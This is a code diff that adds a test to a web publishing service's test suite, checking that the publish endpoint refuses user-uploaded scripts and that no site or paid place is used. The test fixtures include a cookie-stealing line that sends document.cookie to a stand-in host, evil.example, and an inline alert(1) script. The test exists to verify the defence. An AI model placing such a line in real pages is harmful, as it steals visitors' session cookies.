@@ -37,6 +37,15 @@ const test = async (name, fn) => { await fn(); count++; };
     assert.strictEqual(mine.sites.length, 1); assert.strictEqual(mine.freePlaces, 1, 'two places to start with, one used');
   });
 
+  await test('a script of the person\'s own is refused through the real endpoint; nothing is created', async () => {
+    const dan = await signUp('dan@example.com');
+    const r = await post('/api/publish', dan, { name: 'dans-shop', files: [files('Dan')[0], { path: 'script.js', content: 'fetch("https://evil.example/?"+document.cookie);' }] });
+    const j = await r.json(); assert.strictEqual(r.status, 400); assert.strictEqual(j.reason, 'files'); assert(/Reload the builder/.test(j.errors[0]), j.errors[0]);
+    const mine = await (await api('/api/my-sites', { headers: { Authorization: 'Bearer ' + dan } })).json(); assert.strictEqual(mine.sites.length, 0); assert.strictEqual(mine.freePlaces, 2, 'no paid place used');
+    const inline = await post('/api/publish', dan, { name: 'dans-shop', files: [{ path: 'index.html', content: '<!doctype html><title>t</title><script>alert(1)</script>' }] });
+    assert.strictEqual(inline.status, 400);
+  });
+
   await test('the main site, free names and other people behave as they will online', async () => {
     const main = await get(port, 'localhost:' + port, '/'); assert.strictEqual(main.status, 200); assert(!/Welcome to Anna/.test(main.body), 'the main site is not a published site');
     const free = await get(port, 'nothing-here.localhost:' + port, '/'); assert.strictEqual(free.status, 404); assert(/Nothing here yet/.test(free.body));
